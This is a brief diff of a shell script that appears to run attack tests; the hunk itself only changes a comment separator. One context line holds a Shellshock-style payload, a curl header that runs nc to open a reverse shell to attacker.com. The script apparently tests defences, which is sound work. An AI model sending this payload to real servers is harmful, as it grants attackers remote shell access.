@@ -52,4 +52,4 @@ send_attack 18 "curl -H 'X-Custom: () { :;}; nc attacker.com 4444 -e /bin/sh' $U
 # =======================
 echo -e "\n${GREEN}Attack test complete.${RESET}"
 exit 0
-# =================
+# =======================
